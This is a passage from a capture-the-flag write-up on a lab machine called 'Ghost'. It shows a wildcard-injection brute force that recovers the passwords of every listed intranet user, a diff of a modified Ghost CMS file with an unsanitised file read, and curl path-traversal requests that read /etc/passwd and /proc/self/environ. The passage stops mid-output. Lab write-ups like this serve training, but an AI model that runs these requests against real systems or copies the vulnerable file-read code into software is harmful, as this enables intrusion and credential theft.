ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The News page mentions an ongoing Git migration and the Intranet portal development. The key takeaway is that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitea_temp_principal</code></span><span class="SemanticString"> is the only enabled account on Gitea, and it shares the same password as the Intranet account.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805aaa10dde4ffe3e2da" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Credentials for the site are also said to be temporary, so it’s unlikely they can be reused for domain authentication.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78085a4bfc5b8f9c50976" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_users.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_users.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7806ab51dd23a9683b8ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Users tab shows a list of all Intranet users. Based on the “Member of” column, they seem to also be domain users, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">justin.bradley</code></span><span class="SemanticString"> is in the Remote Management Users group.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780af8e11fd552e44690b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll note them all down, as these may be useful for password spraying later on.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780a49980c738eeaa6561" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_blogposts.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/intranet_blogposts.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7800aab16dc546b43cced" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Forums contains several discussion threads. The top one is complaining about connection issues to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bitbucket.ghost.htb</code></span><span class="SemanticString">, which Kathryn explained it’s due to a missing DNS entry.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78040a1b4cae031f2cbd2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780509f1fcdc3327b574e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Gitea Password Brute-force:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7802b86a0cd7ceffa4585" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">That pretty much covers all of Intranet, I haven’t found anything beyond what’s already mentioned. The next thing to look at is Gitea, but I’ll need to find the password of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitea_temp_principal</code></span><span class="SemanticString"> first.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78032af37cbd4768312fd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To do this, I’ll exploit the wildcard injection differently. Rather than bypassing login, the wildcard can be leveraged to recover the password itself. For example, if the password is “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">abcd</code></span><span class="SemanticString">”, inputs of “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">*</code></span><span class="SemanticString">”, “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">a*</code></span><span class="SemanticString">”, “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ab*</code></span><span class="SemanticString">” or “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">abc*</code></span><span class="SemanticString">” would all result in successful authentication. By using this logic, an attacker can programmatically iterate through the key space and recover the password character-by-character.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780c589a6e85c43643440" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve created a Python script for the brute-forcing, which can be found in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/Ghost/ldap_brute.py">my GitHub</a></span><span class="SemanticString">. While I’m at it, I might as well recover the passwords for all Intranet users:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780208166e31a74070d1c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> python3.11 ldap_brute.py kathryn.holland cassandra.shelton robert.steeves florence.ramirez justin.bradley arthur.boyd beth.clark charles.gray jason.taylor intranet_principal gitea_temp_principal

[*] Brute-forcing password for kathryn.holland...
[*] Testing value: fgevlfymxrksvu9b;
[+] Password for kathryn.holland found: fgevlfymxrksvu9b
[*] Brute-forcing password for cassandra.shelton...
[*] Testing value: zdjx9fh57cbc4xcr;
[+] Password for cassandra.shelton found: zdjx9fh57cbc4xcr
[*] Brute-forcing password for robert.steeves...
[*] Testing value: deerdxk8p2xnukxl;
[+] Password for robert.steeves found: deerdxk8p2xnukxl
[*] Brute-forcing password for florence.ramirez...
[*] Testing value: tc6nhytlemglqoat;
[+] Password for florence.ramirez found: tc6nhytlemglqoat
[*] Brute-forcing password for justin.bradley...
[*] Testing value: rbhuycyjxfjp4c69;
[+] Password for justin.bradley found: rbhuycyjxfjp4c69
[*] Brute-forcing password for arthur.boyd...
[*] Testing value: lhhx3kylwqdjxjqp;
[+] Password for arthur.boyd found: lhhx3kylwqdjxjqp
[*] Brute-forcing password for beth.clark...
[*] Testing value: qdcskgpdhyb4jfv6;
[+] Password for beth.clark found: qdcskgpdhyb4jfv6
[*] Brute-forcing password for charles.gray...
[*] Testing value: lwfpjgzlcyx64kdl;
[+] Password for charles.gray found: lwfpjgzlcyx64kdl
[*] Brute-forcing password for jason.taylor...
[*] Testing value: qudsvb6kvcxuumaq;
[+] Password for jason.taylor found: qudsvb6kvcxuumaq
[*] Brute-forcing password for intranet_principal...
[*] Testing value: rvxyrc2okalucrep;
[+] Password for intranet_principal found: rvxyrc2okalucrep
[*] Brute-forcing password for gitea_temp_principal...
[*] Testing value: szrr8kpc3z6onlqf;
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>[+] Password for gitea_temp_principal found: szrr8kpc3z6onlqf</span></mark></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780f3b75de28c3458c5fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gitea_temp_principal</code></span><span class="SemanticString">&#x27;s password, I can log in and access an organization </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ghost-dev</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780d897eac97c3de61711" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_org.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_org.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7805b8d4dfa5f35e9193b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It contains two repositories: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">blog</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">intranet</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78039a6d8fe8528485135" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_repos.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_repos.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7805e95cfc21f16bbb59e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve also attempted to reuse these creds for domain login. As expected though, none of them worked.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7804f9383d0700d3c0cc0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780979e4ad79727753c9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Gitea — Blog:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7808aa03cf03ad4d12c5c" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_blog.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/gitea_blog.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780fbbfb4df7a53a1bd4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This repo contains 4 files related to the ongoing development of the integration between the Ghost blog and Intranet. The Readme notes that the integration uses an API key stored as an environment variable, as well as showing the key used for accessing Ghost’s API endpoints.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780ff890dee6752486c0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">posts-public.js</code></span><span class="SemanticString"> is a modified version of Ghost CMS’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/TryGhost/Ghost/blob/main/ghost/core/core/server/api/endpoints/posts-public.js">source code</a></span><span class="SemanticString">. This version has additional functionalities that pulls data from local files when users query post information.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780a6a8bee3773f116167" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> diff original-posts-public.js htb-posts-public.js 

26,31d25
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>&lt; /**
&lt;  *
&lt;  * @param {import(&#x27;@tryghost/api-framework&#x27;).Frame} frame
&lt;  * @param {object} options
&lt;  * @returns {object}
&lt;  */</span></mark></span><span class="SemanticString"><span>
61,63c55
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>&lt; 
&lt; /** @type {import(&#x27;@tryghost/api-framework&#x27;).Controller} */
&lt; const controller = {</span></mark></span><span class="SemanticString"><span>
---
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>&gt; module.exports = {</span></mark></span><span class="SemanticString"><span>
111c103
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>&lt;         query(frame) {</span></mark></span><span class="SemanticString"><span>
---
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>&gt;         async query(frame) {</span></mark></span><span class="SemanticString"><span>
116c108,117
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>&lt;             return postsService.browsePosts(options);</span></mark></span><span class="SemanticString"><span>
---
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>&gt;             const posts = await postsService.browsePosts(options);
&gt;             const extra = frame.original.query?.extra;
&gt;             if (extra) {
&gt;                 const fs = require(&quot;fs&quot;);
&gt;                 if (fs.existsSync(extra)) {
&gt;                     const fileContent = fs.readFileSync(&quot;/var/lib/ghost/extra/&quot; + extra, { encoding: &quot;utf8&quot; });
&gt;                     posts.meta.extra = { [extra]: fileContent };
&gt;                 }
&gt;             }
&gt;             return posts;</span></mark></span><span class="SemanticString"><span>
183,184d183
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>&lt; 
&lt; module.exports = controller;</span></mark></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780d89afcc8ebf39d5b10" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The file read implementation looks quite dodgy, and possibly vulnerable to LFI given the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">extra</code></span><span class="SemanticString"> parameter is directly used in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">fs.readFileSync()</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f1ae4ae54a723766ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7806ab0a4dfc2a63c49de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Ghost API LFI:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780c6b17def01cf5d79f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ghost.org/docs/content-api/#posts">API docs</a></span><span class="SemanticString">, a POST request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/ghost/api/content/posts/</code></span><span class="SemanticString"> would return a list of posts alongside some metadata:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808bb58ee2dccc8fa8e0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> curl &#x27;http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&#x27; -s | jq

{
  &quot;posts&quot;: [
    {
      &quot;id&quot;: &quot;65bdd2dc26db7d00010704b5&quot;,
      &quot;uuid&quot;: &quot;22db47b3-bbf6-426d-9fcf-887363df82cf&quot;,
      &quot;title&quot;: &quot;Embarking on the Supernatural Journey: Welcome to Ghost!&quot;,
      &quot;slug&quot;: &quot;embarking-on-the-supernatural-journey-welcome-to-ghost&quot;,
      &quot;html&quot;: &quot;&lt;p&gt;Greetings, fellow seekers of the unknown!&lt;/p&gt;&lt;p&gt;It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.&lt;/p&gt;&lt;h2 id=\&quot;why-ghost\&quot;&gt;Why Ghost?&lt;/h2&gt;&lt;p&gt;The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.&lt;/p&gt;&lt;h2 id=\&quot;what-to-expect\&quot;&gt;What to Expect&lt;/h2&gt;&lt;p&gt;Our digital abode is more than just a collection of stories; it&#x27;s a haven for the curious, the intrepid, and the inquisitive. Here, you&#x27;ll find:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Investigative Chronicles&lt;/strong&gt;: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Tech Tuesdays&lt;/strong&gt;: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Spotlight Series&lt;/strong&gt;: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Community Corner&lt;/strong&gt;: Ghost is more than a website; it&#x27;s a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=\&quot;join-us-on-this-extraordinary-expedition\&quot;&gt;Join Us on this Extraordinary Expedition&lt;/h2&gt;&lt;p&gt;The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.&lt;/p&gt;&lt;p&gt;Ghost is not just a website; it&#x27;s a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.&lt;/p&gt;&lt;p&gt;Welcome to our realm. Let the haunting begin!&lt;/p&gt;&lt;p&gt;Happy ghost hunting,&lt;/p&gt;&lt;p&gt;The Ghost Team&lt;/p&gt;&quot;,
      &quot;comment_id&quot;: &quot;659cdeec9cd6330001baefbf&quot;,
      &quot;feature_image&quot;: null,
      &quot;featured&quot;: true,
      &quot;visibility&quot;: &quot;public&quot;,
      &quot;created_at&quot;: &quot;2024-01-09T05:51:40.000+00:00&quot;,
      &quot;updated_at&quot;: &quot;2024-01-09T05:52:59.000+00:00&quot;,
      &quot;published_at&quot;: &quot;2024-01-09T05:52:29.000+00:00&quot;,
      &quot;custom_excerpt&quot;: null,
      &quot;codeinjection_head&quot;: null,
      &quot;codeinjection_foot&quot;: null,
      &quot;custom_template&quot;: null,
      &quot;canonical_url&quot;: null,
      &quot;url&quot;: &quot;http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/&quot;,
      &quot;excerpt&quot;: &quot;Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.\n\n\nWhy Ghost?\n\nThe quest to understand the supernatural has been etched into the fabric of human history. From anc&quot;,
      &quot;reading_time&quot;: 1,
      &quot;access&quot;: true,
      &quot;comments&quot;: false,
      &quot;og_image&quot;: null,
      &quot;og_title&quot;: null,
      &quot;og_description&quot;: null,
      &quot;twitter_image&quot;: null,
      &quot;twitter_title&quot;: null,
      &quot;twitter_description&quot;: null,
      &quot;meta_title&quot;: null,
      &quot;meta_description&quot;: null,
      &quot;email_subject&quot;: null,
      &quot;frontmatter&quot;: null,
      &quot;feature_image_alt&quot;: null,
      &quot;feature_image_caption&quot;: null
    }
  ],
  &quot;meta&quot;: {
    &quot;pagination&quot;: {
      &quot;page&quot;: 1,
      &quot;limit&quot;: 15,
      &quot;pages&quot;: 1,
      &quot;total&quot;: 1,
      &quot;next&quot;: null,
      &quot;prev&quot;: null
    }
  }
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780ac9607d106cd9e2505" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The additional feature lets users specify a filename with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">extra</code></span><span class="SemanticString"> parameter, it then reads the file in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/lib/ghost/extra/</code></span><span class="SemanticString"> and returns its contents, alongside other metadata. Since there’s no input sanitization, path traversal characters can be injected to read files outside the intended directory, such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7806a91d3e6cae57e60b2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> curl &#x27;http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../../../../../../etc/passwd&amp;key=a5af628828958c976a3b6cc81a&#x27; -s | jq 

{
  &quot;posts&quot;: [
    {
      &quot;id&quot;: &quot;65bdd2dc26db7d00010704b5&quot;,
      &quot;uuid&quot;: &quot;22db47b3-bbf6-426d-9fcf-887363df82cf&quot;,
      &quot;title&quot;: &quot;Embarking on the Supernatural Journey: Welcome to Ghost!&quot;,
      &quot;slug&quot;: &quot;embarking-on-the-supernatural-journey-welcome-to-ghost&quot;,
      &quot;html&quot;: &quot;&lt;p&gt;Greetings, fellow seekers of the unknown!&lt;/p&gt;&lt;p&gt;It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.&lt;/p&gt;&lt;h2 id=\&quot;why-ghost\&quot;&gt;Why Ghost?&lt;/h2&gt;&lt;p&gt;The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.&lt;/p&gt;&lt;h2 id=\&quot;what-to-expect\&quot;&gt;What to Expect&lt;/h2&gt;&lt;p&gt;Our digital abode is more than just a collection of stories; it&#x27;s a haven for the curious, the intrepid, and the inquisitive. Here, you&#x27;ll find:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Investigative Chronicles&lt;/strong&gt;: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Tech Tuesdays&lt;/strong&gt;: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Spotlight Series&lt;/strong&gt;: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Community Corner&lt;/strong&gt;: Ghost is more than a website; it&#x27;s a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=\&quot;join-us-on-this-extraordinary-expedition\&quot;&gt;Join Us on this Extraordinary Expedition&lt;/h2&gt;&lt;p&gt;The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.&lt;/p&gt;&lt;p&gt;Ghost is not just a website; it&#x27;s a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.&lt;/p&gt;&lt;p&gt;Welcome to our realm. Let the haunting begin!&lt;/p&gt;&lt;p&gt;Happy ghost hunting,&lt;/p&gt;&lt;p&gt;The Ghost Team&lt;/p&gt;&quot;,
      &quot;comment_id&quot;: &quot;659cdeec9cd6330001baefbf&quot;,
      &lt;..SNIP..&gt;
      &quot;frontmatter&quot;: null,
      &quot;feature_image_alt&quot;: null,
      &quot;feature_image_caption&quot;: null
    }
  ],
  &quot;meta&quot;: {
    &quot;pagination&quot;: {
      &quot;page&quot;: 1,
      &quot;limit&quot;: 15,
      &quot;pages&quot;: 1,
      &quot;total&quot;: 1,
      &quot;next&quot;: null,
      &quot;prev&quot;: null
    },
    &quot;extra&quot;: {
      &quot;../../../../../../../../../etc/passwd&quot;: &quot;root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n&quot;
    }
  }
}</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780c6ab4bfd5e2cf7e7c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Environment variables can be retrieved by reading </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/proc/self/environ</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780668408e2eb4c42cc2f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> curl &#x27;http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../../../../../../proc/self/environ&amp;key=a5af628828958c976a3b6cc81a&#x27; -s | jq

{
  &quot;posts&quot;: [
    {
      &quot;id&quot;: &quot;65bdd2dc26db7d00010704b5&quot;,
      &quot;uuid&quot;: &quot;22db47b3-bbf6-426d-9fcf-887363df82cf&quot;,
      &quot;title&quot;: &quot;Embarking on the Supernatural Journey: Welcome to Ghost!&quot;,
      &quot;slug&quot;: &quot;embarking-on-the-supernatural-journey-welcome-to-ghost&quot;,
      &quot;html&quot;: &quot;&lt;p&gt;Greetings, fellow seekers of the unknown!&lt;/p&gt;&lt;p&gt;It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.&lt;/p&gt;&lt;h2 id=\&quot;why-ghost\&quot;&gt;Why Ghost?&lt;/h2&gt;&lt;p&gt;The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.&lt;/p&gt;&lt;h2 id=\&quot;what-to-expect\&quot;&gt;What to Expect&lt;/h2&gt;&lt;p&gt;Our digital abode is more than just a collection of stories; it&#x27;s a haven for the curious, the intrepid, and the inquisitive. Here, you&#x27;ll find:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;Investigative Chronicles&lt;/strong&gt;: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Tech Tuesdays&lt;/strong&gt;: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the 